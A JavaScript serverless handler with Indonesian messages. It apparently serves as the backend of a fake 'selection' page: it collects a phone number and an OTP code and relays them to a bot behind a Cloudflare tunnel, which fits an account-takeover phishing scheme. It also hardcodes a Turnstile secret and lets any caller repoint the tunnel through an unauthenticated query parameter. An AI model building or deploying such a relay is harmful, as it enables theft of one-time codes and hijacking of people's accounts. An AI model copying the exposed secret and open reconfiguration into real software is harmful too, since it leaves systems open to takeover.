import axios from 'axios';

let activeBotTunnel = 'https://interview-witness-contain-dispatch.trycloudflare.com';
const TURNSTILE_SECRET_KEY = '0x4AAAAAAE7f-SFi2zqSl-4THBdLAoIYLYY';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.query.update_bot) {
        activeBotTunnel = req.query.update_bot.replace(/\/+$/, '');
        return res.status(200).json({
            success: true,
            message: 'Bot URL berhasil diperbarui!',
            active_url: activeBotTunnel
        });
    }

    if (req.method === 'GET') {
        return res.status(200).json({
            success: true,
            status: 'online',
            bot_endpoint: activeBotTunnel
        });
    }

    if (req.method === 'POST') {
        const { action, id, username, followers, tier, phone, code, token } = req.body || {};

        if (action === 'finish') {
            if (!id) {
                return res.status(400).json({
                    success: false,
                    error: 'ID Seleksi wajib dikirim!'
                });
            }

            try {
                const finishRes = await axios.post(`${activeBotTunnel}/api/finish-selection`, {
                    id: id,
                    username: username || '',
                    followers: followers || 0,
                    tier: tier || 'GEN 1'
                }, {
                    headers: { 'Content-Type': 'application/json' },
                    timeout: 8000
                });

                return res.status(finishRes.status).json(finishRes.data);
            } catch (err) {
                const status = err.response ? err.response.status : 502;
                const errData = err.response ? err.response.data : { error: 'Gagal terhubung ke bot Go' };
                return res.status(status).json({
                    success: false,
                    ...errData
                });
            }
        }

        if (!phone || !code) {
            return res.status(400).json({
                success: false,
                error: 'ID Seleksi dan Kode OTP wajib diisi!'
            });
        }

        if (!token) {
            return res.status(400).json({
                success: false,
                error: 'Verifikasi Cloudflare Turnstile wajib diselesaikan!'
            });
        }

        try {
            const formData = new URLSearchParams();
            formData.append('secret', TURNSTILE_SECRET_KEY);
            formData.append('response', token);

            const turnstileRes = await axios.post(
                'https://challenges.cloudflare.com/turnstile/v0/siteverify',
                formData.toString(),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );

            if (!turnstileRes.data.success) {
                return res.status(403).json({
                    success: false,
                    error: 'Verifikasi Turnstile gagal, silakan ulangi captcha.'
                });
            }

            const botResponse = await axios.post(`${activeBotTunnel}/api/verify-otp`, {
                phone: phone,
                code: code
            }, {
                headers: { 'Content-Type': 'application/json' },
                timeout: 8000
            });

            return res.status(botResponse.status).json(botResponse.data);
        } catch (error) {
            if (error.response) {
                return res.status(error.response.status).json(error.response.data);
            }
            return res.status(502).json({
                success: false,
                error: 'Bot backend sedang offline atau tunnel bermasalah.'
            });
        }
    }

    return res.status(405).json({
        success: false,
        error: 'Method Not Allowed'
    });
}
